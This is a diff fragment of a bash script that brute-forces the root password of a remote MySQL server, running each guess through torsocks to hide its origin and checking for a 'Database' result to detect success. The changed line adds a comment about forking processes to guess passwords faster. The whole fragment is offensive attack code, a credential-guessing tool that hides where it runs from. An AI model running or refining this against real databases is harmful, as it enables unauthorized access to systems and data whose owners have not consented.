@@ -18,7 +18,7 @@ correct=Database
 	# Calculate the percentage of tryed passwords.
 	percent=$((100*$item/$total))
 	echo "$percent percent done"
-	## Need to find a why to check if access was granted. ##
+	# Fork the process to gewt fast password guessing.
 	( querry=$(torsocks mysql -h $address -u root -p"$pw" -e "show databases" |  head -n 1)
 	clear
 	if [ "$querry" == "$correct" ]; then
